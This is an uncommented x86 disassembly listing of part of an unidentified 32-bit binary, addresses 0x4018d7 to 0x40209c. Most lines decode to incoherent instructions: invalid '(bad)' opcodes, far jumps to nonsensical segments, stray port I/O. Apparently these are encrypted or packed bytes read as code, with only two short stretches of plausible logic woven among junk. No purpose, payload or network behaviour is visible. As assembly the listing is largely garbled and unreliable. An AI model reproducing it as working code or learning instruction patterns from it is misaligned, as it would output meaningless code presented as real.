  4018d7:	lods   al,BYTE PTR ds:[esi]
  4018d8:	sahf   
  4018d9:	add    ebp,DWORD PTR [ebp+0x33]
  4018dc:	or     al,0x99
  4018de:	jl     0x401944
  4018e0:	cmp    cl,BYTE PTR [edx-0x27]
  4018e3:	ret    0xb95b
  4018e6:	xchg   esi,eax
  4018e8:	xor    eax,0x7e25d2ef
  4018ed:	xchg   esp,eax
  4018ee:	cld    
  4018ef:	inc    eax
  4018f0:	jmp    0xf2ee:0x645093
  4018f7:	mov    dh,0xbe
  4018f9:	xor    dl,BYTE PTR [ecx-0x78]
  4018fc:	xor    ecx,DWORD PTR [ebp*4-0x6f62049c]
  401903:	fwait
  401904:	aaa    
  401905:	dec    ecx
  401906:	outs   dx,BYTE PTR ds:[esi]
  401907:	nop
  401908:	lea    ebx,[ecx+0x2c]
  40190b:	cmp    al,ah
  40190d:	cmp    DWORD PTR [edx-0x24046f56],edi
  401913:	ins    BYTE PTR es:[edi],dx
  401914:	test   eax,0x124b1a49
  401919:	inc    edi
  40191a:	sub    ebx,DWORD PTR [edi-0x5c]
  40191d:	fsub   st(7),st
  40191f:	pop    ss
  401920:	mov    WORD PTR [edx+ebp*4],ss
  401923:	mov    ebx,0xa071cbbe
  401928:	mov    eax,DWORD PTR [ecx+ecx*1]
  40192b:	les    ebx,FWORD PTR [esi]
  40192d:	scas   eax,DWORD PTR es:[edi]
  40192e:	hlt    
  40192f:	outs   dx,BYTE PTR ds:[esi]
  401930:	int    0xb
  401932:	aad    0xf4
  401934:	push   ecx
  401935:	dec    ebp
  401936:	sar    DWORD PTR [edx-0x231c0b58],1
  40193c:	xchg   ebp,eax
  40193d:	push   edi
  40193e:	mov    DWORD PTR [edx],esi
  401940:	push   edx
  401941:	cld    
  401942:	(bad)  [edx+ebp*2]
  401945:	xchg   ebx,eax
  401946:	push   edi
  401947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401948:	cmc    
  401949:	test   eax,0x1d25b891
  40194e:	cmc    
  40194f:	out    dx,al
  401950:	popf   
  401951:	scas   al,BYTE PTR es:[edi]
  401952:	cld    
  401953:	add    dl,ch
  401955:	ss es retf 
  401958:	push   ss
  401959:	fstp   DWORD PTR [edi-0x2c]
  40195c:	cld    
  40195d:	je     0x401982
  40195f:	mov    bl,ah
  401961:	push   esi
  401962:	dec    esp
  401963:	push   cs
  401964:	out    dx,eax
  401965:	shl    DWORD PTR [ebx+0x60b0f651],cl
  40196b:	xchg   DWORD PTR [eax],esp
  40196d:	not    DWORD PTR [ebx-0xe]
  401970:	cmp    cl,BYTE PTR [ebx-0x503211b]
  401976:	sbb    al,ah
  401978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401979:	stos   DWORD PTR es:[edi],eax
  40197a:	iret   
  40197b:	mov    edi,eax
  40197d:	xchg   edx,eax
  40197e:	jecxz  0x40195f
  401980:	outs   dx,DWORD PTR ds:[esi]
  401981:	ret    0xd006
  401984:	cmp    eax,0x49321ba5
  401989:	xchg   esp,eax
  40198a:	inc    esp
  40198b:	int3   
  40198c:	popa   
  40198d:	pop    ds
  40198e:	(bad)  
  40198f:	push   0x4bee74f7
  401994:	sub    BYTE PTR [ecx],cl
  401996:	fdiv   DWORD PTR [ebp+0x4d2b5e0d]
  40199c:	push   ds
  40199d:	cmp    esi,esi
  40199f:	pushf  
  4019a0:	push   esp
  4019a1:	dec    ebp
  4019a2:	or     BYTE PTR [esi-0x3f293281],ch
  4019a8:	push   0x7c
  4019aa:	popa   
  4019ab:	in     al,0xa6
  4019ad:	imul   ecx,esi,0xa5bacef4
  4019b3:	add    bl,BYTE PTR [edx+0x55c53d76]
  4019b9:	adc    DWORD PTR [eax],0x841ca3aa
  4019bf:	lds    edx,FWORD PTR [ebx-0x75]
  4019c2:	and    al,0xd5
  4019c4:	inc    ebx
  4019c5:	(bad)
  4019c8:	mov    eax,0x6d1a41a0
  4019cd:	in     eax,0x63
  4019cf:	sub    eax,0x69a6a2b3
  4019d4:	or     DWORD PTR [eax+ebp*2+0x2b47dd85],ecx
  4019db:	pop    esi
  4019dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019dd:	cwde   
  4019de:	pusha  
  4019df:	mov    edi,0xef2e8895
  4019e4:	(bad)  [eax+0x3b]
  4019e7:	pushf  
  4019e8:	pop    ecx
  4019e9:	inc    edx
  4019ea:	popf   
  4019eb:	pop    DWORD PTR [esi]
  4019ed:	dec    eax
  4019ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019ef:	push   eax
  4019f0:	jo     0x401a00
  4019f2:	jno    0x4019a2
  4019f4:	jo     0x401998
  4019f6:	fldenv ds:0x825c6d8a
  4019fc:	xor    BYTE PTR [ebx],0xeb
  4019ff:	shr    DWORD PTR [ecx-0x10],0xac
  401a03:	dec    edx
  401a04:	(bad)  
  401a05:	sbb    BYTE PTR [edi+0xdeea3ae],0x1f
  401a0c:	add    DWORD PTR [eax-0x1c703f9f],ebp
  401a12:	cmc    
  401a13:	jnp    0x4019c1
  401a15:	push   es
  401a16:	pop    ebp
  401a17:	out    0x5b,al
  401a19:	xor    eax,0xe60499af
  401a1e:	mov    ?,WORD PTR [ebx+0x1c98be94]
  401a24:	pop    ebp
  401a25:	mov    cl,0x19
  401a27:	pop    ecx
  401a28:	sub    BYTE PTR [edx+ebp*4],dh
  401a2b:	xor    eax,0x79c69775
  401a30:	repz pop ebp
  401a32:	ds addr16 (bad) 
  401a35:	cdq    
  401a36:	pop    es
  401a37:	xor    esi,DWORD PTR [eax-0x7b]
  401a3a:	push   esp
  401a3b:	test   al,0xf8
  401a3d:	lods   al,BYTE PTR ds:[esi]
  401a3f:	xor    DWORD PTR [eax+esi*2],0x3139e6f6
  401a46:	addr16 mov edi,0xf46400ff
  401a4c:	repz mov ds:0x176f7652,eax
  401a52:	add    al,0x99
  401a54:	or     eax,0x1f5a8070
  401a59:	fld    TBYTE PTR [ecx]
  401a5b:	add    eax,0xa02519ae
  401a60:	pusha  
  401a61:	stos   BYTE PTR es:[edi],al
  401a62:	mov    eax,DWORD PTR [ebp+0x8]
  401a65:	and    DWORD PTR ds:0x4346cf,0x0
  401a6f:	mov    ecx,DWORD PTR ds:0x4346cf
  401a75:	inc    ecx
  401a76:	mov    DWORD PTR ds:0x4346cf,ecx
  401a7c:	cmp    DWORD PTR ds:0x4346cf,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x4346cf,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x4346cf
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x4346cf,ecx
  401aae:	cmp    DWORD PTR ds:0x4346cf,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0xba90485e
  401ae8:	sbb    eax,0x7e0452e7
  401aed:	jle    0x401aa4
  401aef:	jg     0x401b6f
  401af1:	jle    0x401adc
  401af3:	xchg   edx,eax
  401af4:	push   edx
  401af5:	call   0x967d68dc
  401afa:	xchg   edx,eax
  401afb:	sti    
  401afc:	xchg   ebp,eax
  401afd:	js     0x401b41
  401aff:	cmp    al,0x3a
  401b01:	sub    BYTE PTR [esi-0x5a],dh
  401b04:	mov    BYTE PTR [ecx+0x589cae29],bl
  401b0a:	sbb    edi,0x25535365
  401b10:	xchg   esp,eax
  401b11:	stc    
  401b12:	add    al,0x48
  401b14:	ret    0x7d1e
  401b17:	clc    
  401b18:	mov    DWORD PTR [ebx+ecx*4],esi
  401b1b:	pop    edi
  401b1c:	mov    al,0x87
  401b1e:	mov    esp,0x5082c4a5
  401b23:	pop    ebx
  401b24:	(bad)  
  401b25:	cdq    
  401b26:	mov    edx,0x242dbae8
  401b2b:	(bad)  
  401b2c:	call   0x75ab:0xcb0814b0
  401b33:	leave  
  401b34:	scas   eax,DWORD PTR es:[edi]
  401b35:	sub    al,0x5c
  401b37:	stos   BYTE PTR es:[edi],al
  401b38:	ins    BYTE PTR es:[edi],dx
  401b39:	inc    eax
  401b3a:	pop    es
  401b3b:	call   0xfd58e7e8
  401b40:	mov    edx,0x977e16b8
  401b45:	cmp    ebx,esi
  401b47:	mov    eax,ds:0x52d8aa9d
  401b4c:	cmp    DWORD PTR [ebp-0x68f81b18],ecx
  401b52:	bound  edx,QWORD PTR [ebx]
  401b54:	mov    edi,0xce7694f9
  401b59:	dec    esp
  401b5a:	mov    bh,0x78
  401b5c:	(bad)  
  401b5d:	and    al,0xb0
  401b5f:	popa   
  401b60:	xlat   BYTE PTR ds:[ebx]
  401b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b62:	jmp    0x401ba4
  401b64:	mov    ebp,ebp
  401b66:	xor    eax,0x132ed4e6
  401b6b:	and    al,0x1a
  401b6d:	ret    
  401b6e:	inc    esp
  401b6f:	out    dx,eax
  401b70:	cmp    dl,bl
  401b72:	push   eax
  401b73:	sbb    dl,dl
  401b75:	std    
  401b76:	jmp    0xf937:0xb43bd689
  401b7d:	lods   al,BYTE PTR ds:[esi]
  401b7e:	aad    0xd1
  401b80:	cmp    DWORD PTR [ebp-0x131fbd98],0x37
  401b87:	ins    DWORD PTR es:[edi],dx
  401b88:	jl     0x401b3f
  401b8a:	pop    ds
  401b8b:	mov    ds:0x461b1569,eax
  401b90:	ja     0x401b60
  401b92:	aaa    
  401b93:	add    BYTE PTR [eax],dl
  401b95:	fs pop ss
  401b97:	sub    dh,BYTE PTR [edx]
  401b99:	add    BYTE PTR [ebx*2+0x59816ed],dl
  401ba0:	scas   al,BYTE PTR es:[edi]
  401ba1:	jecxz  0x401b2b
  401ba3:	out    dx,eax
  401ba4:	(bad)  
  401ba5:	retf   0xe595
  401ba8:	in     al,dx
  401ba9:	cmc    
  401baa:	rol    BYTE PTR [esi],0x79
  401bad:	jae    0x401bb1
  401baf:	push   edi
  401bb0:	jns    0x401c0d
  401bb2:	popa   
  401bb3:	loop   0x401b5b
  401bb5:	cmc    
  401bb6:	inc    edi
  401bb7:	in     eax,dx
  401bb8:	mov    cl,0x16
  401bba:	cmc    
  401bbb:	jp     0x401bbb
  401bbd:	je     0x401b41
  401bbf:	repnz sbb DWORD PTR [ebx+0x27e928ad],esi
  401bc6:	pop    ecx
  401bc7:	fistp  QWORD PTR [edi+edi*8]
  401bca:	leave  
  401bcb:	push   ebx
  401bcc:	nop
  401bcd:	xor    al,0x70
  401bcf:	in     al,0x5
  401bd1:	sub    BYTE PTR [esi],0x15
  401bd4:	inc    eax
  401bd5:	and    ecx,DWORD PTR [ecx-0x7b]
  401bd8:	xchg   edx,eax
  401bd9:	aas    
  401bda:	mov    bl,0x7b
  401bdc:	push   eax
  401bdd:	in     al,dx
  401bde:	shr    BYTE PTR [edi],cl
  401be0:	mov    eax,0xaaf9f196
  401be5:	inc    ecx
  401be6:	cmp    DWORD PTR [ebp-0x7b],eax
  401be9:	cmp    al,0xd8
  401beb:	push   ebp
  401bec:	dec    ebx
  401bed:	and    DWORD PTR [eax-0x56],0xffffff84
  401bf1:	frstor [edi-0x7d85db6d]
  401bf7:	mov    bh,0x43
  401bf9:	stos   DWORD PTR es:[edi],eax
  401bfa:	sub    al,0xcb
  401bfc:	sbb    edx,ebx
  401bfe:	shr    BYTE PTR [edx+esi*4+0x4f],1
  401c02:	and    eax,0x78edb3a4
  401c07:	pop    es
  401c08:	arpl   dx,bp
  401c0a:	sbb    eax,0xa4f558a4
  401c0f:	push   ecx
  401c10:	mov    ecx,0x4b4231b7
  401c15:	jo     0x401c25
  401c17:	scas   al,BYTE PTR es:[edi]
  401c18:	dec    edi
  401c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c1a:	cmp    BYTE PTR [ebp-0x151d323d],dh
  401c20:	dec    ecx
  401c21:	ret    
  401c22:	or     al,0xf7
  401c24:	call   0x1825:0x5513c0c1
  401c2b:	sub    BYTE PTR [edx+edi*2],cl
  401c2e:	lock mov esp,0xfdde9754
  401c34:	and    BYTE PTR [eax+0x441e923f],ah
  401c3a:	dec    edi
  401c3b:	lock push ebp
  401c3d:	xor    al,0x82
  401c3f:	sahf   
  401c40:	retf   
  401c41:	and    eax,0xbd5cbaa7
  401c46:	mov    bh,0xfb
  401c48:	push   0xffffffd7
  401c4a:	or     bh,cl
  401c4c:	mov    gs,esp
  401c4e:	push   edx
  401c4f:	in     eax,dx
  401c50:	or     cl,ch
  401c52:	call   0xb3812f63
  401c57:	inc    edi
  401c58:	xchg   esp,eax
  401c59:	int3   
  401c5a:	xchg   DWORD PTR [edx-0x3a],ecx
  401c5d:	mov    dh,0x8d
  401c5f:	sbb    dh,BYTE PTR [eax+ecx*4-0x3d]
  401c63:	and    BYTE PTR [si],0x4b
  401c67:	jp     0x401c4e
  401c69:	xor    al,0x76
  401c6b:	add    al,0x6d
  401c6d:	imul   ebx,DWORD PTR [edx+edi*8],0xffffffa0
  401c71:	repz ret 0x243d
  401c75:	mov    eax,ds:0xe23d726c
  401c7a:	add    edi,ebx
  401c7c:	push   eax
  401c7d:	retf   0xa2f1
  401c80:	ins    DWORD PTR es:[edi],dx
  401c81:	sbb    al,0xf
  401c83:	mov    bh,BYTE PTR [edx-0x15439d94]
  401c89:	(bad)  
  401c8a:	sahf   
  401c8b:	jmp    0x1dcd:0xef98a457
  401c92:	dec    esp
  401c93:	mov    bl,0xf9
  401c95:	sub    al,0x32
  401c97:	jge    0x401c37
  401c99:	jbe    0x401cbe
  401c9b:	std    
  401c9c:	(bad)  
  401c9d:	les    edi,FWORD PTR es:[ecx]
  401ca0:	fs mov esp,0xbbdb46fd
  401ca6:	call   0x414b:0xd2a18499
  401cad:	add    BYTE PTR [ebx+0x4d8b6600],cl
  401cb3:	cld    
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	rcr    BYTE PTR [edi+esi*2+0x7e06894a],1
  401cd1:	jle    0x401c88
  401cd3:	jg     0x401d53
  401cd5:	jle    0x401cc8
  401cd7:	ins    DWORD PTR es:[edi],dx
  401cd8:	jmp    0x401d08
  401cda:	icebp  
  401cdb:	aaa    
  401cdc:	push   ecx
  401cdd:	cmp    esi,edx
  401cdf:	push   ebp
  401ce0:	dec    ebx
  401ce1:	enter  0xfbc2,0x44
  401ce5:	sbb    eax,0x45cbd843
  401ceb:	ins    BYTE PTR es:[edi],dx
  401cec:	iret   
  401ced:	dec    esi
  401cee:	cs out dx,eax
  401cf0:	cmc    
  401cf1:	idiv   BYTE PTR [ebx+0x47bbea4f]
  401cf7:	pusha  
  401cf8:	data16 sub ah,BYTE PTR [eax-0x63]
  401cfc:	or     al,0x57
  401cfe:	jbe    0x401d13
  401d00:	and    ebp,eax
  401d02:	push   eax
  401d03:	push   ecx
  401d04:	cmp    DWORD PTR [esi],ebx
  401d06:	adc    bh,bh
  401d08:	dec    edi
  401d09:	stc    
  401d0a:	xchg   DWORD PTR [eax+0x24],ecx
  401d0d:	bound  ecx,QWORD PTR [ebx-0x6b01990a]
  401d13:	mov    bh,0xf5
  401d15:	aaa    
  401d16:	ds aaa 
  401d18:	and    al,0xb9
  401d1a:	fstp   TBYTE PTR [esi-0x2e7bb2b0]
  401d20:	adc    al,0x47
  401d22:	xchg   edi,eax
  401d23:	xchg   edi,eax
  401d24:	aam    0xbb
  401d26:	std    
  401d27:	and    ch,BYTE PTR [eax]
  401d29:	xchg   esp,eax
  401d2a:	or     BYTE PTR [esi-0x75],bh
  401d2d:	int    0x6e
  401d2f:	pop    esi
  401d30:	jnp    0x401d9e
  401d32:	add    DWORD PTR [edi-0x6237fc39],0x6c
  401d39:	mov    al,ds:0x34af6642
  401d3e:	pop    bx
  401d40:	sbb    DWORD PTR [esi-0x46],0xffffffe7
  401d44:	sbb    al,0x41
  401d46:	sahf   
  401d47:	pop    ss
  401d48:	mov    bl,0xa8
  401d4a:	mov    ebp,0xe87b6553
  401d4f:	lahf   
  401d50:	dec    ebx
  401d51:	cmp    esp,ecx
  401d53:	and    al,0xc9
  401d55:	and    BYTE PTR [ebp+edx*2-0x7e3eefcc],dh
  401d5c:	stos   DWORD PTR es:[edi],eax
  401d5d:	jnp    0x401d78
  401d5f:	cwde   
  401d60:	xchg   edx,eax
  401d61:	push   eax
  401d62:	xchg   ebp,eax
  401d63:	mov    ah,BYTE PTR [eax]
  401d65:	pop    ebx
  401d66:	inc    ebx
  401d67:	pop    ss
  401d68:	out    dx,al
  401d69:	mov    edi,0x1be576c5
  401d6e:	ret    0x3b03
  401d71:	dec    esp
  401d72:	sbb    ch,dl
  401d74:	aam    0x3e
  401d76:	xchg   ebx,eax
  401d77:	and    cl,BYTE PTR [edx]
  401d79:	and    al,0x43
  401d7b:	adc    eax,eax
  401d7d:	sbb    al,0x78
  401d7f:	mov    ch,0xb
  401d81:	mov    al,ds:0xf8f36780
  401d86:	aam    0x67
  401d88:	inc    edi
  401d89:	inc    ecx
  401d8a:	pop    ecx
  401d8b:	push   ss
  401d8c:	mov    bl,0x6a
  401d8e:	pop    edi
  401d8f:	cmp    edi,DWORD PTR [esi+edx*8-0x7bf13222]
  401d96:	enter  0xa797,0x4
  401d9a:	fstp   DWORD PTR [ebp+0x467f13a3]
  401da0:	xor    al,0x1c
  401da2:	adc    dh,BYTE PTR [ebx+0x39bc209]
  401da8:	mov    ah,0x6e
  401daa:	or     bh,0x8d
  401dad:	in     eax,0x14
  401daf:	mov    ch,0xa
  401db1:	stos   BYTE PTR es:[edi],al
  401db2:	mov    dh,BYTE PTR [edx]
  401db4:	out    0xf7,al
  401db6:	cmp    eax,0x3d7645b0
  401dbb:	push   eax
  401dbc:	daa    
  401dbd:	cwde   
  401dbe:	dec    ebx
  401dbf:	dec    ecx
  401dc0:	push   cs
  401dc1:	fidiv  WORD PTR [edi-0x52]
  401dc4:	mov    ebx,0x6b6fe2d6
  401dc9:	(bad)  ds:0x1d6af05a
  401dcf:	xor    al,0x3
  401dd1:	xor    ch,ah
  401dd3:	push   ebp
  401dd4:	mov    cl,0x90
  401dd6:	and    ah,BYTE PTR [eax+ecx*4-0x4d767b5a]
  401ddd:	cwde   
  401dde:	jno    0x401df7
  401de0:	ret    0xc89
  401de3:	mov    ebp,edx
  401de5:	aas    
  401de6:	mov    edx,0x80ae1efd
  401deb:	add    DWORD PTR [ebx+0x61],eax
  401dee:	bound  eax,QWORD PTR [edx]
  401df0:	xchg   ecx,eax
  401df1:	add    edi,0x6a17f619
  401df7:	cmp    eax,0x63e52cbc
  401dfc:	mov    edx,0xe34b9dc9
  401e01:	mov    edi,0xf0b86ec1
  401e06:	mov    ebp,0x3172d4d1
  401e0b:	mov    BYTE PTR [eax+ecx*4+0x17],0x53
  401e10:	jecxz  0x401e44
  401e12:	sbb    al,0x2d
  401e14:	lods   eax,DWORD PTR ds:[esi]
  401e15:	cdq    
  401e16:	adc    eax,0xffffffd8
  401e19:	inc    ebp
  401e1a:	adc    DWORD PTR [edi],esp
  401e1c:	(bad)  
  401e1d:	xlat   BYTE PTR ds:[ebx]
  401e1e:	jne    0x401e5b
  401e20:	and    ebp,ebp
  401e22:	add    al,0xf
  401e24:	retf   0x697c
  401e27:	adc    al,0x25
  401e29:	(bad)  
  401e2a:	retf   0xd0ca
  401e2d:	cmp    esp,DWORD PTR [eax-0x2361f88f]
  401e33:	xchg   ebp,eax
  401e34:	xor    esi,esp
  401e36:	sub    eax,ecx
  401e38:	or     edx,ebx
  401e3a:	(bad)  
  401e3b:	(bad)  [eax]
  401e3d:	mov    ebp,0xadc0016f
  401e42:	adc    DWORD PTR [eax+0x5f],ebp
  401e45:	fisub  WORD PTR [ebp+0x26]
  401e48:	mov    ds:0x3c20f1e5,al
  401e4d:	pop    ss
  401e4e:	sbb    al,0xee
  401e50:	jnp    0x401df3
  401e52:	stos   BYTE PTR es:[edi],al
  401e53:	jno    0x401dea
  401e55:	shl    DWORD PTR [ebp+0x56822111],0x90
  401e5c:	loopne 0x401df6
  401e5e:	and    eax,ebx
  401e60:	xor    ebx,DWORD PTR [ecx-0x58878fab]
  401e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e67:	sub    al,0x4c
  401e69:	mov    ch,0x57
  401e6b:	push   esp
  401e6c:	in     al,dx
  401e6d:	pushf  
  401e6e:	leave  
  401e6f:	dec    ebp
  401e70:	xchg   ebp,eax
  401e71:	mov    eax,ds:0xffede691
  401e76:	test   al,0xc9
  401e78:	jmp    0x2ed0009d
  401e7d:	sar    DWORD PTR [esp+eiz*2+0x1a],cl
  401e81:	cdq    
  401e82:	xchg   esi,eax
  401e83:	xchg   ebp,eax
  401e84:	sub    esp,DWORD PTR [esi+0x3ee648a0]
  401e8a:	cli    
  401e8b:	test   DWORD PTR [ebp-0x77],esp
  401e8e:	dec    ebp
  401e8f:	call   0x8b4c641f
  401e94:	dec    ebp
  401e95:	or     al,0x33
  401e97:	mov    BYTE PTR [ebx],0xc0
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	cmp    esp,esi
  401eb1:	(bad)  
  401eb2:	out    0xc0,eax
  401eb4:	add    BYTE PTR [esi+0x7e],bh
  401eb7:	mov    ch,0x7f
  401eb9:	jle    0x401f39
  401ebb:	popa   
  401ebc:	iret   
  401ebd:	push   edi
  401ebe:	sub    DWORD PTR [edx],eax
  401ec0:	nop
  401ec1:	mov    esp,0xbb88050d
  401ec6:	add    BYTE PTR ds:0xbad69735,ah
  401ecc:	mov    ds:0xcb90eae6,eax
  401ed1:	pop    es
  401ed2:	pop    ecx
  401ed3:	add    al,0x9a
  401ed5:	mov    cl,0x2
  401ed7:	push   ds
  401ed8:	arpl   WORD PTR [ecx],bx
  401eda:	jg     0x401e78
  401edc:	sub    DWORD PTR [edi+0xae62d98],0x4
  401ee3:	sti    
  401ee4:	and    DWORD PTR [ebx+0x14],ecx
  401ee7:	xchg   ecx,eax
  401ee9:	xchg   edx,eax
  401eea:	stos   BYTE PTR es:[edi],al
  401eeb:	inc    ecx
  401eec:	stc    
  401eed:	sbb    BYTE PTR [ecx-0x6cc19234],al
  401ef3:	inc    edx
  401ef4:	jmp    0x401f5d
  401ef6:	sar    ecx,1
  401ef8:	les    ebx,FWORD PTR [ecx+0x2c]
  401efb:	cmc    
  401efc:	fdivr  st(5),st
  401efe:	sub    ah,ch
  401f00:	je     0x401eb6
  401f02:	mov    al,0x5
  401f04:	or     al,ch
  401f06:	sar    DWORD PTR [esi],cl
  401f08:	add    cl,BYTE PTR [edx-0xe]
  401f0b:	pop    ss
  401f0c:	cmp    BYTE PTR [ebx-0x306d478d],0xbb
  401f13:	add    DWORD PTR [edi],edx
  401f15:	add    al,0x3c
  401f17:	in     al,dx
  401f18:	lea    ebp,[edi]
  401f1a:	pop    eax
  401f1b:	fs lahf 
  401f1d:	mov    dh,0xf
  401f1f:	dec    ebx
  401f20:	dec    esp
  401f21:	lea    edx,[esi-0x37440f94]
  401f27:	ret    0xb125
  401f2a:	xchg   ecx,eax
  401f2b:	test   DWORD PTR [edi+0x68],esi
  401f2e:	jg     0x401ed2
  401f30:	ds dec ecx
  401f32:	mov    esi,DWORD PTR [ecx]
  401f34:	(bad)  
  401f35:	fadd   st(7),st
  401f37:	inc    ebp
  401f38:	push   esi
  401f39:	js     0x401f91
  401f3b:	lahf   
  401f3c:	mov    ds:0x134741eb,eax
  401f41:	fstp   QWORD PTR [esi-0x7c96370a]
  401f47:	mov    ah,0x3f
  401f49:	cs cmp bl,dl
  401f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f4d:	mov    dh,0x8a
  401f4f:	outs   dx,BYTE PTR ds:[esi]
  401f50:	mov    ebp,0xb6b9792f
  401f55:	xchg   ecx,eax
  401f56:	cld    
  401f57:	cld    
  401f58:	mov    eax,ds:0x1a9fe485
  401f5d:	or     eax,DWORD PTR ss:[ebx]
  401f60:	jecxz  0x401f91
  401f62:	int3   
  401f63:	or     ebp,DWORD PTR [ebx+ebp*8]
  401f66:	mov    edx,0xc5b09dd7
  401f6b:	add    DWORD PTR cs:[ebp+0x486b1eb6],eax
  401f72:	in     al,dx
  401f73:	out    dx,al
  401f74:	jecxz  0x401fde
  401f76:	cmp    BYTE PTR [ebx],bh
  401f78:	pop    edi
  401f79:	xor    bh,BYTE PTR [eax+0x69]
  401f7c:	jbe    0x401f91
  401f7e:	mov    eax,0x2fa9e06f
  401f83:	(bad)  
  401f84:	das    
  401f85:	(bad)  
  401f86:	popw   ds
  401f88:	xchg   ecx,eax
  401f89:	push   DWORD PTR [ebp-0x9]
  401f8c:	pop    edx
  401f8d:	bound  ecx,QWORD PTR [ecx]
  401f8f:	lea    edx,[eax-0x4]
  401f92:	add    al,0x23
  401f94:	nop
  401f95:	jg     0x401f8d
  401f97:	les    edx,FWORD PTR ds:0x9652f3ca
  401f9d:	ds sbb dl,0xaa
  401fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fa2:	call   0xf476981b
  401fa7:	daa    
  401fa8:	push   ds
  401fa9:	ror    DWORD PTR [ecx*8+0x5f88da51],cl
  401fb0:	lods   al,BYTE PTR ds:[esi]
  401fb1:	sbb    eax,edx
  401fb3:	(bad)  
  401fb5:	xor    al,0x7b
  401fb7:	jne    0x402004
  401fb9:	sbb    eax,0xf5bec34c
  401fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fbf:	pop    eax
  401fc0:	stc    
  401fc1:	shl    DWORD PTR [edx+0x23],cl
  401fc4:	stos   DWORD PTR es:[edi],eax
  401fc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc6:	enter  0x72ee,0x93
  401fca:	lahf   
  401fcb:	fcomip st,st(6)
  401fcd:	(bad)  
  401fcf:	mov    esi,0x5847b2e0
  401fd4:	arpl   WORD PTR ds:0x51c25942,si
  401fda:	xor    cl,0x61
  401fdd:	push   0x9d2b7041
  401fe2:	adc    al,0x73
  401fe4:	mov    dl,0x78
  401fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fe7:	rcl    DWORD PTR [ecx-0x7c7f45d1],cl
  401fed:	adc    DWORD PTR [esi-0x24c7daf4],esi
  401ff3:	pusha  
  401ff4:	aaa    
  401ff5:	out    0xe7,al
  401ff7:	fisttp DWORD PTR [eax+0x21]
  401ffa:	pop    ebx
  401ffb:	addr16 mov bh,0x76
  401ffe:	int    0xf
  402000:	xor    ebp,edx
  402002:	addr16 sahf 
  402004:	cmp    eax,0xd95945a8
  402009:	(bad)
  40200c:	and    DWORD PTR [ebx],edx
  40200e:	clc    
  40200f:	add    esi,ebx
  402011:	and    DWORD PTR [edi-0x3270293a],ecx
  402017:	in     eax,0xbf
  402019:	hlt    
  40201a:	adc    BYTE PTR [edi-0x38],cl
  40201d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40201e:	mov    eax,DWORD PTR [ebp+0x2cb61ab0]
  402024:	stos   BYTE PTR es:[edi],al
  402025:	leave  
  402026:	xor    eax,DWORD PTR [eax]
  402028:	lods   al,BYTE PTR ds:[esi]
  402029:	fisttp QWORD PTR [eax+0x2130f78e]
  40202f:	jecxz  0x40205f
  402031:	jecxz  0x402020
  402033:	rcl    BYTE PTR [edx+0x16],0xac
  402037:	push   ecx
  402038:	or     eax,0xd0f79600
  40203d:	pop    edi
  40203e:	fdivr  QWORD PTR ds:0x547754a7
  402044:	dec    ebp
  402045:	ins    DWORD PTR es:[edi],dx
  402046:	cs dec edi
  402048:	jmp    0xf2a85b87
  40204d:	mov    BYTE PTR [eax+0x1d3a73b7],bh
  402053:	xor    BYTE PTR ds:0x62d9e3d7,dl
  402059:	cmp    eax,edx
  40205b:	cmp    DWORD PTR [eax-0x21d51a5a],ecx
  402061:	imul   esp,DWORD PTR [edx],0x4b64099c
  402067:	das    
  402068:	cmc    
  402069:	sti    
  40206a:	call   DWORD PTR [ebx]
  40206c:	sub    al,0x16
  40206e:	push   ecx
  40206f:	inc    edx
  402070:	jge    0x4020ef
  402072:	mov    ax,WORD PTR [ebp-0x4]
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
